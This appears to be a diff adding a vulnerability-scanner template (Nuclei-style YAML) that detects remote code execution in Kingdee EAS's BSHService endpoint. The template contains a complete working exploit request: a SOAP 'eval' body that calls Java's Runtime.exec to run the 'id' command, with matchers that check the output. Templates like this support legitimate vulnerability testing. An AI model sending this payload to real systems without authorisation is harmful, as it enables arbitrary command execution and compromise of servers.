@@ -1,0 +1,36 @@
+id: kingdee-EAS-BSHService-rce
+info:
+  name: kingdee-EAS-BSHService-rce
+  author: lemonlove7
+  severity: critical
+http:
+  - raw:
+      - |-
+        POST /ormrpc/services/BSHService HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh,zh-CN;q=0.9
+        Connection: keep-alive
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/#eval"
+        Content-Length: 645
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+          <soapenv:Body>
+            <eval xmlns="http://tempuri.org/">
+              <in0 xsi:type="xsd:string"><![CDATA[c = java.lang.Class.forName("java.lang.Runtime");rt = c.getMethod("getRuntime", null).invoke(null, null);p = rt.exec("id");r = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));o = "";while ((l = r.readLine()) != null) o = o + l + "\n";o;]]></in0>
+            </eval>
+          </soapenv:Body>
+        </soapenv:Envelope>
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - 'uid='
+          - 'gid='
+    matchers-condition: and
